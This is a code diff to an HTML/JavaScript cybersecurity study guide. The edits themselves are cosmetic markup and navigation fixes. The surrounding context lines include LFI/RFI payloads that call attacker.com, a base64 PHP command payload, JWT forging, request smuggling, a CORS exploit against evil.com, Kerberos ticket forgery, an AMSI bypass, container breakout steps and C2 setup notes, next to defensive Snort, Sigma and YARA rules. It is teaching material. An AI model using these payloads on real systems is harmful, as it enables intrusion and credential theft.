-<div class="tbox-b"><pre><button class="cpy" onclick="copyCode(this)"></button><code># Basic traversal
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><span class="ttle">LFI Payloads</span></div>
+<div class="tbox-b"><pre><code># Basic traversal
 ../../../etc/passwd
 ....//....//....//etc/passwd
 
@@ -8555,8 +8556,8 @@ data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
 # Set session value containing PHP code</code></pre></div>
 </div>
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><span class="ttle">RFI Payloads</span></div>
-<div class="tbox-b"><pre><button class="cpy" onclick="copyCode(this)"></button><code># Remote file inclusion
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><span class="ttle">RFI Payloads</span></div>
+<div class="tbox-b"><pre><code># Remote file inclusion
 http://attacker.com/shell.txt
 http://attacker.com/shell.txt%00
 http://attacker.com/shell.txt?.php
@@ -8576,8 +8577,8 @@ php://filter/convert.base64-encode/resource=http://attacker.com/shell.txt</code>
 Header contains algorithm, payload contains claims, signature verifies integrity.</div>
 <h3>Attack Types</h3>
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><span class="ttle">JWT Attacks</span></div>
-<div class="tbox-b"><pre><button class="cpy" onclick="copyCode(this)"></button><code># 1. Algorithm:none
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><span class="ttle">JWT Attacks</span></div>
+<div class="tbox-b"><pre><code># 1. Algorithm:none
 # Change header: {"alg":"none","typ":"JWT"}
 # Remove signature (leave trailing dot)
 python3 -c "import base64,json; h=base64.urlsafe_b64decode('eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0='); print(h)"
@@ -8633,8 +8634,8 @@ python3 jwt_tool.py JWT -C -d rockyou.txt
 </table>
 <h3>BOLA Exploitation</h3>
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><span class="ttle">BOLA Testing</span></div>
-<div class="tbox-b"><pre><button class="cpy" onclick="copyCode(this)"></button><code># Access other users' resources
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><span class="ttle">BOLA Testing</span></div>
+<div class="tbox-b"><pre><code># Access other users' resources
 GET /api/users/123/orders  &#8594; change to /api/users/456/orders
 GET /api/documents/report.pdf  &#8594; change ID sequentially
 
@@ -8660,8 +8661,8 @@ GET /api/v2/users/123  (v2 has auth)</code></pre></div>
 <tr><td>TE.TE</td><td>Both use TE, but parse differently (obfuscation needed)</td></tr>
 </table>
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><span class="ttle">CL.TE Smuggling</span></div>
-<div class="tbox-b"><pre><button class="cpy" onclick="copyCode(this)"></button><code>POST / HTTP/1.1
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><span class="ttle">CL.TE Smuggling</span></div>
+<div class="tbox-b"><pre><code>POST / HTTP/1.1
 Host: target.com
 Content-Length: 6
 Transfer-Encoding: chunked
@@ -8682,8 +8683,8 @@ ABC</code></pre></div>
 <div class="col-h"><span class="ci">&#9654;</span><span class="ct">CORS Misconfiguration</span></div>
 <div class="col-b">
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><span class="ttle">CORS Attacks</span></div>
-<div class="tbox-b"><pre><button class="cpy" onclick="copyCode(this)"></button><code># Test for reflect origin
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><span class="ttle">CORS Attacks</span></div>
+<div class="tbox-b"><pre><code># Test for reflect origin
 Origin: http://evil.com
 # Check if Access-Control-Allow-Origin: http://evil.com
 
@@ -8712,8 +8713,8 @@ req.send();
 <div class="col-h"><span class="ci">&#9654;</span><span class="ct">Subdomain Takeover</span></div>
 <div class="col-b">
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><span class="ttle">Subdomain Takeover</span></div>
-<div class="tbox-b"><pre><button class="cpy" onclick="copyCode(this)"></button><code># Find dangling CNAME records
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><span class="ttle">Subdomain Takeover</span></div>
+<div class="tbox-b"><pre><code># Find dangling CNAME records
 dig CNAME subdomain.target.com
 host subdomain.target.com
 
@@ -8741,8 +8742,8 @@ subfinder -d target.com | httpx | nuclei -t takeovers/</code></pre></div>
 <div class="col-b">
 <h3>Common Flaws</h3>
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><span class="ttle">Logic Flaws</span></div>
-<div class="tbox-b"><pre><button class="cpy" onclick="copyCode(this)"></button><code># Price manipulation
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><span class="ttle">Logic Flaws</span></div>
+<div class="tbox-b"><pre><code># Price manipulation
 # Change quantity to negative: qty=-1 (refund)
 # Change price parameter
 # Coupon abuse: apply multiple coupons
@@ -8771,8 +8772,8 @@ subfinder -d target.com | httpx | nuclei -t takeovers/</code></pre></div>
 <div class="col-b">
 <h3>WAF Detection</h3>
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><span class="ttle">WAF Detection</span></div>
-<div class="tbox-b"><pre><button class="cpy" onclick="copyCode(this)"></button><code># wafw00f
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><span class="ttle">WAF Detection</span></div>
+<div class="tbox-b"><pre><code># wafw00f
 wafw00f http://target.com
 
 # nmap
@@ -8785,8 +8786,8 @@ curl -I http://target.com
 </div>
 <h3>Bypass Techniques</h3>
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><span class="ttle">WAF Bypass</span></div>
-<div class="tbox-b"><pre><button class="cpy" onclick="copyCode(this)"></button><code># Case variation
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><span class="ttle">WAF Bypass</span></div>
+<div class="tbox-b"><pre><code># Case variation
 SeLeCt * FrOm UsErS
 
 # Inline comments
@@ -8822,8 +8823,8 @@ GET /page HTTP/1.1%0d%0aHost: target.com%0d%0a%0d%0aGET /admin</code></pre></div
 <div class="col-h"><span class="ci">&#9654;</span><span class="ct">Web Server Misconfigurations</span></div>
 <div class="col-b">
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><span class="ttle">Common Misconfigs</span></div>
-<div class="tbox-b"><pre><button class="cpy" onclick="copyCode(this)"></button><code># Directory listing
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><span class="ttle">Common Misconfigs</span></div>
+<div class="tbox-b"><pre><code># Directory listing
 # Visit /icons/, /backup/, /uploads/
 
 # .git directory exposed
@@ -8923,9 +8924,9 @@ http://target.com/www.zip</code></pre></div>
       <h3>Registry &amp; SAM Database</h3>
       <p>The Windows registry stores configuration data. The SAM (Security Account Manager) stores hashed passwords for local accounts.</p>
       <div class="tbox">
-        <div class="tbox-bar"><span></span><span></span><span></span><span>Key Registry Hives</span></div>
+        <div class="tbox-bar"><div class="td r"></div><div class="td y"></div><div class="td g"></div><span>Key Registry Hives</span></div>
         <div class="tbox-b">
-          <pre><button class="cpy" onclick="copyCode(this)"></button><code>HKEY_LOCAL_MACHINE\SYSTEM      — System state, services
+          <pre><code>HKEY_LOCAL_MACHINE\SYSTEM      — System state, services
 HKEY_LOCAL_MACHINE\SOFTWARE    — Installed software
 HKEY_LOCAL_MACHINE\SAM         — User account hashes (locked)
 HKEY_LOCAL_MACHINE\SECURITY    — LSA secrets, cache
@@ -8967,9 +8968,9 @@ HKEY_CURRENT_USER\Software     — Per-user config</code></pre>
 
       <h3>AD Attacks</h3>
       <div class="tbox">
-        <div class="tbox-bar"><span></span><span></span><span></span><span>Key AD Attack Vectors</span></div>
+        <div class="tbox-bar"><div class="td r"></div><div class="td y"></div><div class="td g"></div><span>Key AD Attack Vectors</span></div>
         <div class="tbox-b">
-          <pre><button class="cpy" onclick="copyCode(this)"></button><code># Golden Ticket — Forged TGT using krbtgt hash
+          <pre><code># Golden Ticket — Forged TGT using krbtgt hash
 mimikatz # kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /krbtgt:hash
 
 # Silver Ticket — Forged TGS for specific service
@@ -9013,9 +9014,9 @@ secretsdump.py corp.local/'DC01$'@10.0.0.1 -just-dc</code></pre>
 
       <h3>Linux Hardening Checklist</h3>
       <div class="tbox">
-        <div class="tbox-bar"><span></span><span></span><span></span><span>Essential Hardening</span></div>
+        <div class="tbox-bar"><div class="td r"></div><div class="td y"></div><div class="td g"></div><span>Essential Hardening</span></div>
         <div class="tbox-b">
-          <pre><button class="cpy" onclick="copyCode(this)"></button><code># Disable root SSH login
+          <pre><code># Disable root SSH login
 sed -i 's/PermitRootLogin yes/PermitRootLogin no/' /etc/ssh/sshd_config
 # Set up fail2ban
 apt install fail2ban
@@ -9098,9 +9099,9 @@ crontab -l; ls /etc/cron.d/</code></pre>
     <div class="col-b">
       <h3>Strings &amp; PE Analysis</h3>
       <div class="tbox">
-        <div class="tbox-bar"><span></span><span></span><span></span><span>Static Analysis Commands</span></div>
+        <div class="tbox-bar"><div class="td r"></div><div class="td y"></div><div class="td g"></div><span>Static Analysis Commands</span></div>
         <div class="tbox-b">
-          <pre><button class="cpy" onclick="copyCode(this)"></button><code># Extract strings
+          <pre><code># Extract strings
 strings -n 8 malware.exe
 # PE header analysis
 python3 -c "import pefile; pe=pefile.PE('malware.exe'); print(pe.dump_info())"
@@ -9117,9 +9118,9 @@ binwalk -E malware.exe</code></pre>
 
       <h3>YARA Rules</h3>
       <div class="tbox">
-        <div class="tbox-bar"><span></span><span></span><span></span><span>YARA Rule Example</span></div>
+        <div class="tbox-bar"><div class="td r"></div><div class="td y"></div><div class="td g"></div><span>YARA Rule Example</span></div>
         <div class="tbox-b">
-          <pre><button class="cpy" onclick="copyCode(this)"></button><code>rule Suspicious_PowerShell {
+          <pre><code>rule Suspicious_PowerShell {
     meta:
         author = "Analyst"
         description = "Detects obfuscated PowerShell"
@@ -9148,9 +9149,9 @@ binwalk -E malware.exe</code></pre>
 
       <h3>API Monitoring &amp; Debugging</h3>
       <div class="tbox">
-        <div class="tbox-bar"><span></span><span></span><span></span><span>Dynamic Analysis Tools</span></div>
+        <div class="tbox-bar"><div class="td r"></div><div class="td y"></div><div class="td g"></div><span>Dynamic Analysis Tools</span></div>
         <div class="tbox-b">
-          <pre><button class="cpy" onclick="copyCode(this)"></button><code># ProcMon (Process Monitor) — Registry, file, network activity
+          <pre><code># ProcMon (Process Monitor) — Registry, file, network activity
 # API Monitor — Trace all API calls with parameters
 # x64dbg — Windows user-mode debugger
 # GDB with pwndbg — Linux debugging + exploit dev
@@ -9256,9 +9257,9 @@ ltrace ./malware
 6. Use forensically clean media for evidence storage</p></div>
 
       <div class="tbox">
-        <div class="tbox-bar"><span></span><span></span><span></span><span>Disk Acquisition Commands</span></div>
+        <div class="tbox-bar"><div class="td r"></div><div class="td y"></div><div class="td g"></div><span>Disk Acquisition Commands</span></div>
         <div class="tbox-b">
-          <pre><button class="cpy" onclick="copyCode(this)"></button><code># Bit-for-bit disk copy
+          <pre><code># Bit-for-bit disk copy
 dd if=/dev/sda of=/evidence/disk.img bs=4M status=progress
 
 # With hash verification
@@ -9279,9 +9280,9 @@ pyaff4up /dev/sda /evidence/case001.aff4</code></pre>
     <div class="col-b">
       <h3>Volatility Framework</h3>
       <div class="tbox">
-        <div class="tbox-bar"><span></span><span></span><span></span><span>Volatility 3 Commands</span></div>
+        <div class="tbox-bar"><div class="td r"></div><div class="td y"></div><div class="td g"></div><span>Volatility 3 Commands</span></div>
         <div class="tbox-b">
-          <pre><button class="cpy" onclick="copyCode(this)"></button><code># List processes
+          <pre><code># List processes
 vol3 -f memory.dmp windows.pslist
 vol3 -f memory.dmp windows.pstree
 
@@ -9331,9 +9332,9 @@ vol3 -f memory.dmp windows.handles</code></pre>
 
       <h3>Key Log Sources</h3>
       <div class="tbox">
-        <div class="tbox-bar"><span></span><span></span><span></span><span>Forensic Artifacts</span></div>
+        <div class="tbox-bar"><div class="td r"></div><div class="td y"></div><div class="td g"></div><span>Forensic Artifacts</span></div>
         <div class="tbox-b">
-          <pre><button class="cpy" onclick="copyCode(this)"></button><code>Windows:
+          <pre><code>Windows:
   - Prefetch (C:\Windows\)       — Program execution history
   - Jump Lists                   — Recent file access
   - USBSTOR registry             — USB device history
@@ -9429,9 +9430,9 @@ Linux:
     <div class="col-h"><span class="ci">▶</span><span class="ct">Aircrack-ng Suite</span></div>
     <div class="col-b">
       <div class="tbox">
-        <div class="tbox-bar"><span></span><span></span><span></span><span>Aircrack-ng Workflow</span></div>
+        <div class="tbox-bar"><div class="td r"></div><div class="td y"></div><div class="td g"></div><span>Aircrack-ng Workflow</span></div>
         <div class="tbox-b">
-          <pre><button class="cpy" onclick="copyCode(this)"></button><code># Enable monitor mode
+          <pre><code># Enable monitor mode
 airmon-ng start wlan0
 
 # Scan for networks
@@ -9466,9 +9467,9 @@ hashcat -m 22000 hash.txt wordlist.txt</code></pre>
       </div>
 
       <div class="tbox">
-        <div class="tbox-bar"><span></span><span></span><span></span><span>Bluetooth Tools</span></div>
+        <div class="tbox-bar"><div class="td r"></div><div class="td y"></div><div class="td g"></div><span>Bluetooth Tools</span></div>
         <div class="tbox-b">
-          <pre><button class="cpy" onclick="copyCode(this)"></button><code># btscanner — Scan for Bluetooth devices
+          <pre><code># btscanner — Scan for Bluetooth devices
 btscanner
 
 # Bluetooth Low Energy analysis
@@ -9491,9 +9492,9 @@ ble.enum AA:BB:CC:DD:EE:FF</code></pre>
 
       <h3>RFID/NFC Cloning</h3>
       <div class="tbox">
-        <div class="tbox-bar"><span></span><span></span><span></span><span>Proxmark3 Commands</span></div>
+        <div class="tbox-bar"><div class="td r"></div><div class="td y"></div><div class="td g"></div><span>Proxmark3 Commands</span></div>
         <div class="tbox-b">
-          <pre><button class="cpy" onclick="copyCode(this)"></button><code># Read RFID tag
+          <pre><code># Read RFID tag
 lf search
 hf search
 
@@ -9568,9 +9569,9 @@ BadUSB: USB HID injection (Rubber Ducky compatible)</p></div>
       </table>
 
       <div class="tbox">
-        <div class="tbox-bar"><span></span><span></span><span></span><span>Encryption Examples</span></div>
+        <div class="tbox-bar"><div class="td r"></div><div class="td y"></div><div class="td g"></div><span>Encryption Examples</span></div>
         <div class="tbox-b">
-          <pre><button class="cpy" onclick="copyCode(this)"></button><code># AES encryption (openssl)
+          <pre><code># AES encryption (openssl)
 openssl enc -aes-256-cbc -salt -in plaintext.txt -out encrypted.bin
 
 # RSA key generation
@@ -9602,9 +9603,9 @@ openssl pkeyutl -decrypt -inkey private.pem -in msg.enc -out msg.txt</code></pre
 
       <h3>Hash Cracking Methodology</h3>
       <div class="tbox">
-        <div class="tbox-bar"><span></span><span></span><span></span><span>Hashcat Workflow</span></div>
+        <div class="tbox-bar"><div class="td r"></div><div class="td y"></div><div class="td g"></div><span>Hashcat Workflow</span></div>
         <div class="tbox-b">
-          <pre><button class="cpy" onclick="copyCode(this)"></button><code># Identify hash type
+          <pre><code># Identify hash type
 hashid '$2b$12$...'  # bcrypt
 hash-identifier
 
@@ -9692,9 +9693,9 @@ hashcat -m 1000 hashes.txt wordlist.txt -r rules/best64.rule</code></pre>
       </table>
 
       <div class="tbox">
-        <div class="tbox-bar"><span></span><span></span><span></span><span>AWS Enumeration</span></div>
+        <div class="tbox-bar"><div class="td r"></div><div class="td y"></div><div class="td g"></div><span>AWS Enumeration</span></div>
         <div class="tbox-b">
-          <pre><button class="cpy" onclick="copyCode(this)"></button><code># Check caller identity
+          <pre><code># Check caller identity
 aws sts get-caller-identity
 
 # Enumerate IAM
@@ -9730,9 +9731,9 @@ pacu &gt; iam__privesc_scan</code></pre>
 
       <h3>Docker Security</h3>
       <div class="tbox">
-        <div class="tbox-bar"><span></span><span></span><span></span><span>Container Breakout Techniques</span></div>
+        <div class="tbox-bar"><div class="td r"></div><div class="td y"></div><div class="td g"></div><span>Container Breakout Techniques</span></div>
         <div class="tbox-b">
-          <pre><button class="cpy" onclick="copyCode(this)"></button><code># Check if running in Docker
+          <pre><code># Check if running in Docker
 cat /proc/1/cgroup | grep docker
 
 # Docker socket mounted (escape to host)
@@ -9764,9 +9765,9 @@ sh -c "echo \$\$ &gt; /tmp/cgrp/x/cgroup.procs"</code></pre>
       </div>
 
       <div class="tbox">
-        <div class="tbox-bar"><span></span><span></span><span></span><span>Kubernetes Enumeration</span></div>
+        <div class="tbox-bar"><div class="td r"></div><div class="td y"></div><div class="td g"></div><span>Kubernetes Enumeration</span></div>
         <div class="tbox-b">
-          <pre><button class="cpy" onclick="copyCode(this)"></button><code># Check if in Kubernetes
+          <pre><code># Check if in Kubernetes
 ls /var/run/secrets/kubernetes.io/
 
 # List all pods
@@ -9833,9 +9834,9 @@ curl -k -H "Authorization: Bearer $TOKEN" \
     <div class="col-b">
       <h3>APK Contents</h3>
       <div class="tbox">
-        <div class="tbox-bar"><span></span><span></span><span></span><span>APK Structure</span></div>
+        <div class="tbox-bar"><div class="td r"></div><div class="td y"></div><div class="td g"></div><span>APK Structure</span></div>
         <div class="tbox-b">
-          <pre><button class="cpy" onclick="copyCode(this)"></button><code>app.apk
+          <pre><code>app.apk
 ├── AndroidManifest.xml    — Permissions, activities, services
 ├── classes.dex            — Compiled Dalvik bytecode
 ├── resources.arsc         — Compiled resource table
@@ -9870,9 +9871,9 @@ curl -k -H "Authorization: Bearer $TOKEN" \
       </table>
 
       <div class="tbox">
-        <div class="tbox-bar"><span></span><span></span><span></span><span>Frida Hooking Examples</span></div>
+        <div class="tbox-bar"><div class="td r"></div><div class="td y"></div><div class="td g"></div><span>Frida Hooking Examples</span></div>
         <div class="tbox-b">
-          <pre><button class="cpy" onclick="copyCode(this)"></button><code>// Hook Android function
+          <pre><code>// Hook Android function
 Java.perform(function() {
     var Main = Java.use('com.target.MainActivity');
     Main.checkPin.implementation = function(pin) {
@@ -9903,9 +9904,9 @@ Java.perform(function() {
     <div class="col-b">
       <h3>Root Detection Bypass</h3>
       <div class="tbox">
-        <div class="tbox-bar"><span></span><span></span><span></span><span>Root Bypass Methods</span></div>
+        <div class="tbox-bar"><div class="td r"></div><div class="td y"></div><div class="td g"></div><span>Root Bypass Methods</span></div>
         <div class="tbox-b">
-          <pre><button class="cpy" onclick="copyCode(this)"></button><code># Method 1: Frida root bypass
+          <pre><code># Method 1: Frida root bypass
 frida -U -f com.app -l root_bypass.js --no-pause
 
 # Method 2: Magisk Hide (hide root from specific apps)
@@ -9919,9 +9920,9 @@ android root disable</code></pre>
 
       <h3>SSL Pinning Bypass</h3>
       <div class="tbox">
-        <div class="tbox-bar"><span></span><span></span><span></span><span>SSL Pinning Bypass</span></div>
+        <div class="tbox-bar"><div class="td r"></div><div class="td y"></div><div class="td g"></div><span>SSL Pinning Bypass</span></div>
         <div class="tbox-b">
-          <pre><button class="cpy" onclick="copyCode(this)"></button><code># Objection (easiest)
+          <pre><code># Objection (easiest)
 objection -g com.app explore
 android sslpinning disable
 
@@ -10010,9 +10011,9 @@ mitmproxy --mode transparent --set stream_large_bodies=1m</code></pre>
     <div class="col-b">
       <h3>AMSI Bypass</h3>
       <div class="tbox">
-        <div class="tbox-bar"><span></span><span></span><span></span><span>AMSI Evasion Methods</span></div>
+        <div class="tbox-bar"><div class="td r"></div><div class="td y"></div><div class="td g"></div><span>AMSI Evasion Methods</span></div>
         <div class="tbox-b">
-          <pre><button class="cpy" onclick="copyCode(this)"></button><code># Method 1: Reflection (patch AmsiScanBuffer)
+          <pre><code># Method 1: Reflection (patch AmsiScanBuffer)
 $a=[Ref].Assembly.GetTypes()|?{$_.Name -like "*iUtils"}
 $b=$a.GetFields('NonPublic,Static')|?{$_.Name -like "*Context"}
 [IntPtr]$c=$b.GetValue($null)
@@ -10057,9 +10058,9 @@ $b=$a.GetFields('NonPublic,Static')|?{$_.Name -like "*Context"}
     <div class="col-h"><span class="ci">▶</span><span class="ct">Red Team Infrastructure</span></div>
     <div class="col-b">
       <div class="tbox">
-        <div class="tbox-bar"><span></span><span></span><span></span><span>Infrastructure Setup</span></div>
+        <div class="tbox-bar"><div class="td r"></div><div class="td y"></div><div class="td g"></div><span>Infrastructure Setup</span></div>
         <div class="tbox-b">
-          <pre><button class="cpy" onclick="copyCode(this)"></button><code># Redirector setup (nginx)
+          <pre><code># Redirector setup (nginx)
 # Domain fronting with Cloudflare/Azure CDN
 # Malleable C2 profiles for Cobalt Strike
 # Domain categorization checks before use
@@ -10123,9 +10124,9 @@ $b=$a.GetFields('NonPublic,Static')|?{$_.Name -like "*Context"}
       </table>
 
       <div class="tbox">
-        <div class="tbox-bar"><span></span><span></span><span></span><span>Splunk Detection Queries</span></div>
+        <div class="tbox-bar"><div class="td r"></div><div class="td y"></div><div class="td g"></div><span>Splunk Detection Queries</span></div>
         <div class="tbox-b">
-          <pre><button class="cpy" onclick="copyCode(this)"></button><code># Brute force detection
+          <pre><code># Brute force detection
 index=windows EventCode=4625
 | stats count by src_ip, user
 | where count &gt; 10
@@ -10157,9 +10158,9 @@ index=network src_ip!=10.0.0.0/8 dest_port=445
       </table>
 
       <div class="tbox">
-        <div class="tbox-bar"><span></span><span></span><span></span><span>Snort Rule Examples</span></div>
+        <div class="tbox-bar"><div class="td r"></div><div class="td y"></div><div class="td g"></div><span>Snort Rule Examples</span></div>
         <div class="tbox-b">
-          <pre><button class="cpy" onclick="copyCode(this)"></button><code># Detect Metasploit reverse shell
+          <pre><code># Detect Metasploit reverse shell
 alert tcp any any -&gt; $HOME_NET 4444 (
   msg:"Metasploit Reverse Shell";
   content:"|68 00 00 00 00|"; depth:5;
@@ -10207,9 +10208,9 @@ alert tcp any any -&gt; $HOME_NET 443 (
     <div class="col-b">
       <h3>Sigma Rules</h3>
       <div class="tbox">
-        <div class="tbox-bar"><span></span><span></span><span></span><span>Sigma Rule Example</span></div>
+        <div class="tbox-bar"><div class="td r"></div><div class="td y"></div><div class="td g"></div><span>Sigma Rule Example</span></div>
         <div class="tbox-b">
-          <pre><button class="cpy" onclick="copyCode(this)"></button><code>title: Suspicious PowerShell Encoded Command
+          <pre><code>title: Suspicious PowerShell Encoded Command
 status: experimental
 logsource:
     category: create_process
@@ -10322,9 +10323,9 @@ tags:
 
       <h3>Active Directory Lab Setup</h3>
       <div class="tbox">
-        <div class="tbox-bar"><span></span><span></span><span></span><span>AD Lab with GOAD</span></div>
+        <div class="tbox-bar"><div class="td r"></div><div class="td y"></div><div class="td g"></div><span>AD Lab with GOAD</span></div>
         <div class="tbox-b">
-          <pre><button class="cpy" onclick="copyCode(this)"></button><code># Use GOAD (Game of Active Directory)
+          <pre><code># Use GOAD (Game of Active Directory)
 # Automated AD lab with 3 domains, multiple trusts
 # https://github.com/Orange-Cyberdefense/GOAD
 
@@ -10564,9 +10565,9 @@ Install-ADDSForest -DomainName corp.local
 
       <h3>Authorization Letter</h3>
       <div class="tbox">
-        <div class="tbox-bar"><span></span><span></span><span></span><span>Key Authorization Elements</span></div>
+        <div class="tbox-bar"><div class="td r"></div><div class="td y"></div><div class="td g"></div><span>Key Authorization Elements</span></div>
         <div class="tbox-b">
-          <pre><button class="cpy" onclick="copyCode(this)"></button><code>1. Written authorization from system owner
+          <pre><code>1. Written authorization from system owner
 2. Specific scope definition (IP ranges, domains)
 3. Named authorized testers
 4. Duration of authorization
@@ -10839,7 +10840,6 @@ function nav(sid){
 
 function update(){
   let total=SEC.length-1,doneCount=Object.keys(done).length,pct=total?Math.round(doneCount/total*100):0;
-  document.getElementById('pPct').textContent=pct+'%';
   document.getElementById('pFill').style.width=pct+'%';
   document.getElementById('pCount').textContent=doneCount+'/'+total;
   document.getElementById('ringPct').textContent=pct+'%';
@@ -10901,8 +10901,8 @@ function initSearch(){
 function initNav(){
   document.getElementById('mTog').onclick=function(){document.getElementById('sb').classList.toggle('open');document.getElementById('sOv').classList.toggle('show')};
   document.getElementById('sOv').onclick=function(){closeMobile()};
-  document.getElementById('pB').onclick=function(){if(hIdx>0){hIdx--;var p=hist[hIdx];hist.splice(hIdx,hIdx+1);nav(p);hist.pop()}};
-  document.getElementById('nB').onclick=function(){};
+  document.getElementById('pB').onclick=function(){if(hIdx>0){hIdx--;cur=hist[hIdx];nav(cur)}};
+  document.getElementById('nB').onclick=function(){if(hIdx<hist.length-1){hIdx++;cur=hist[hIdx];nav(cur)}}
   document.getElementById('scTrig').onclick=function(){document.getElementById('shortcutModal').classList.add('show')};
   document.getElementById('shareBtn').onclick=function(){
     var doneCount=Object.keys(done).length;
@@ -11268,8 +11268,8 @@ document.addEventListener('keydown',function(e){
     var sc=document.getElementById('shortcutModal');
     sc.classList.toggle('show');
   }
-  if((e.altKey)&&e.key==='ArrowLeft'){e.preventDefault();if(hIdx>0){hIdx--;var p=hist[hIdx];hist.splice(hIdx,hIdx+1);nav(p);hist.pop()}}
-  if((e.altKey)&&e.key==='ArrowRight'){e.preventDefault();if(hIdx<hist.length-1){hIdx++;nav(hist[hIdx])}}
+  if((e.altKey)&&e.key==='ArrowLeft'){e.preventDefault();if(hIdx>0){hIdx--;cur=hist[hIdx];nav(cur)}}
+  if((e.altKey)&&e.key==='ArrowRight'){e.preventDefault();if(hIdx<hist.length-1){hIdx++;cur=hist[hIdx];nav(cur)}}
 });
 
 function initBottomNav(){
@@ -11563,7 +11563,7 @@ function initAnimations(){
       p.style.width=(4+Math.random()*8)+'px';
       p.style.height=(4+Math.random()*8)+'px';
       document.body.appendChild(p);
-      setTimeout(function(el){el.remove()},3000);
+      setTimeout(function(){p.remove()},3000);
     }
   };
 
